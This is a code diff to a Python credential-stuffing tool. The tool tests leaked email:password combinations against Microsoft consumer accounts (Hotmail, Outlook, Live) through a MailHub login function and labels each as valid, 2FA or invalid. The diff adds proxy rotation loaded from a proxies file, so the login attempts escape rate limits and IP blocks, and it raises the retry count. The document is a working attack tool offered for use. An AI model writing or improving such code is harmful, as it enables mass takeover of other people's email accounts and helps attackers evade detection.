@@ -18,6 +18,30 @@ import aiohttp
 import concurrent.futures
 from mailhub import MailHub
 
+def load_proxies() -> list:
+    path = os.path.join("/app", "proxies.txt")
+    if not os.path.exists(path):
+        log.warning("proxies.txt not found, running proxyless")
+        return []
+    with open(path, "r") as f:
+        proxies = [l.strip() for l in f if l.strip()]
+    log.info(f"Loaded {len(proxies)} proxies")
+    return proxies
+
+def get_proxy(proxies: list):
+    if not proxies:
+        return None
+    p = random.choice(proxies)
+    if "://" in p:
+        p = p.split("://", 1)[1]
+    # handle ip:port:user:pass format
+    parts = p.split(":")
+    if len(parts) == 4:
+        p = f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+    return {"http": f"http://{p}", "https": f"http://{p}"}
+
+PROXIES = load_proxies()
+
 MS_DOMAINS = {"hotmail.com", "outlook.com", "live.com", "msn.com", "hotmail.co.uk",
               "hotmail.fr", "hotmail.de", "hotmail.it", "hotmail.es", "outlook.co.uk",
               "live.co.uk", "live.fr", "live.de"}
@@ -130,26 +154,28 @@ def extract_credentials(raw: str) -> list[str]:
     return lines
 
 # ─── CHECKER ─────────────────────────────────────────────────────────────────
-def check_single(combo: str, proxies: list = []) -> tuple[str, str]:
-    """Check a single email:pass combo. Returns (combo, status)."""
+def check_single(combo: str) -> tuple[str, str]:
+    """Check a single email:pass combo with rotating proxies. Returns (combo, status)."""
     try:
         email, password = combo.split(":", 1)
         checker = MailHub()
-        proxy   = None
-        for _ in range(3):
+        for attempt in range(5):
+            proxy = get_proxy(PROXIES)
             try:
                 r = checker.loginMICROSOFT(email, password, proxy)
                 if not r:
-                    return (combo, "INVALID")
+                    continue
                 if r[0] == "ok":
                     return (combo, "VALID")
                 if r[0] == "nfa":
                     return (combo, "2FA")
                 if r[0] == "retry":
+                    # proxy might be dead, rotate to a new one
                     continue
-                return (combo, "INVALID")
+                if r[0] in ("fail", "custom"):
+                    return (combo, "INVALID")
             except Exception:
-                import time; time.sleep(0.5)
+                import time; time.sleep(0.3)
         return (combo, "INVALID")
     except Exception:
         return (combo, "INVALID")
